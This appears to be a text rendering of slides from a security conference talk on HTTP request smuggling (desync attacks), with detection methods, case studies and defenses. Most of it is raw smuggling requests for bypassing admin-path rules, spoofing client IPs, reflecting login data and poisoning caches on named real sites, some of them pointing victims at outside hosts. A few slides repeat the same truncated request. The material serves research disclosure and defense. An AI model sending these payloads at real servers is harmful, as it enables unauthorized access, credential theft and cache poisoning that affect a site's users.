# HTTP Desync Attacks: Smashing into the Cell Next Door

## Presenter: James Kettle

### The Fear Theory
**Q:** What topic am I really scared of?  
**A:** HTTP Request Smuggling

#### Hiding Wookiees in HTTP
- First documented by Watchfire in 2005.
- "You will not earn bounties."
- "You will certainly not be considered like a white hat."

### Outline
1. **Theory & Methodology**
2. **Exploitation Case Studies**
3. **Defense**
4. **Q&A**

### Keepalive and Desynchronization
- **Keepalive, desynchronized:**
  - **Classic Approach:**
    ```http
    POST / HTTP/1.1
    Host: example.com
    Content-Length: 6
    Content-Length: 5
    12345G
    ```
    - Frontend sees: `POST / HTTP/1.1` with `Content-Length: 6`
    - Backend sees: `Unknown method GPOST`

  - **Chunked Approach:**
    ```http
    POST / HTTP/1.1
    Host: example.com
    Content-Length: 66
    Transfer-Encoding: chunked
    0
    GPOST / HTTP/1.1
    ...
    ```
    - Frontend sees: `POST / HTTP/1.1` with `Content-Length: 66`
    - Backend sees: `Unknown method GPOST`

  - **TE.CL Approach:**
    ```http
    POST / HTTP/1.1
    Host: example.com
    Content-Length: 3
    Transfer-Encoding: chunked
    6
    PREFIX
    0
    POST / HTTP/1.1
    Host: example.com
    ...
    ```
    - Frontend sees: `POST / HTTP/1.1` with `Content-Length: 3`
    - Backend sees: `POST / HTTP/1.1` with `Transfer-Encoding: chunked`

- **Forcing Desynchronization:**
  - According to RFC 2616 #4.4.3, if a message is received with both a `Transfer-Encoding` header field and a `Content-Length` header field, the latter MUST be ignored.

### Methodology
- **Detecting Desynchronization:**
  - **CL.CL:** Backend response
  - **TE.TE:** Backend response
  - **TE.CL:** Timeout
  - **CL.TE:** Socket poison

  - Example:
    ```http
    POST /about HTTP/1.1
    Host: example.com
    Transfer-Encoding: chunked
    Content-Length: 6
    3
    abc
    Q
    ```

- **Confirming Desynchronization:**
  - Example:
    ```http
    POST /search HTTP/1.1
    Content-Length: 51
    Transfer-Encoding: zchunked
    11
    =x&q=smuggling&x=
    0
    GET /404 HTTP/1.1
    X: X
    ```

### Case Studies
- **Bypassing Rules:**
  - Example:
    ```http
    POST / HTTP/1.1
    Host: software-vendor.com
    Content-Length: 200
    Transfer-Encoding: chunked
    0
    GET /admin HTTP/1.1
    Host: software-vendor.com
    X: X
    ```

- **Bypassing Rewrites:**
  - Example:
    ```http
    POST / HTTP/1.1
    Host: security-vendor.com
    X-Forwarded-For: 127.0.0.1
    Content-Length: 200
    Transfer-Encoding: chunked
    0
    GET / HTTP/1.1
    Host: security-vendor.com
    X-Forwarded-For: 127.0.0.1
    X: X
    ```

- **Request Reflection:**
  - Example:
    ```http
    POST / HTTP/1.1
    Host: login.newrelic.com
    Content-Length: 142
    Transfer-Encoding: chunked
    Transfer-Encoding: x
    0
    POST /login HTTP/1.1
    Host: login.newrelic.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 100
    ...
    login[email]=asdf
    ```

- **Accidental Cache Poisoning:**
  - Example:
    ```http
    POST / HTTP/1.1
    Host: redacted.com
    Content-Length: 45
    Transfer-Encoding: chunked
    0
    POST / HTTP/1.1
    Host: 52.16.21.24
    X: X
    ```

- **Web Cache Deception++:**
  - Example:
    ```http
    POST / HTTP/1.1
    Transfer-Encoding: blah
    0
    GET /account/settings HTTP/1.1
    X: X
    ```

- **Chaining DOM Problems:**
  - Example:
    ```http
    GET /assets/idx?redir=//PI:EMAIL/ HTTP/1.1
    Host: www.redhat.com
    ```

- **'Harmless' Responses:**
  - Example:
    ```http
    POST /etc/libs/xyz.js HTTP/1.1
    Host: redacted.com
    Content-Length: 57
    Transfer-Encoding: chunked
    0
    POST /etc HTTP/1.1
    Host: burpcollaborator.net
    X: X
    ```

- **Web Cache Poisoning:**
  - Example:
    ```http
    POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1
    Host: c.paypal.com
    Content-Length: 61
    Transfer-Encoding: chunked
    0
    GET /webstatic HTTP/1.1
    Host: skeletonscribe.net
    X: X
    ```

- **Wrapped Exploits:**
  - Example:
    ```http
    GET / HTTP/1.1
    Host: c.paypal.com
    Content-Length: 5
    Transfer-Encoding: chunked
    0
    ```

### Demo
- **Bugzilla:**
  - Example:
    ```http
    GET / HTTP/1.1
    Host: c.paypal.com
    Content-Length: 5
    Transfer-Encoding: chunked
    0
    ```

### Tooling
- **Support manual content-length & chunking**
- **Don't proxy testers**

### Safety
- **Frontend: Normalize ambiguous requests (RFC 7230)**
- **Frontend: Use HTTP/2 to talk to backend**
- **Backend: Drop request & connection**

### Defense
- **Whitepaper:**
  - [HTTP Desync Attacks](https://portswigger.net/blog/http-desync-attacks)
- **Online Labs:**
  - [PortSwigger Web Security Academy](https://portswigger.net/web-security/request-smuggling)
- **Desynchronize:**
  - [GitHub Repository](https://github.com/portswigger/desynchronize)

### References
- [CGI Security: HTTP Request Smuggling](http://cgisecurity.com/lib/HTTP-Request-Smuggling.pdf)
- **DEF CON 24 â€“ regilero: Hiding Wookiees in HTTP**

### Further Reading
- **Detection doesn't have to be dangerous**
- **HTTP parsing is security critical**
- **Complexity is the enemy**

### Takeaways
- **Contact:**
  - @albinowax
  - Email: PI:EMAIL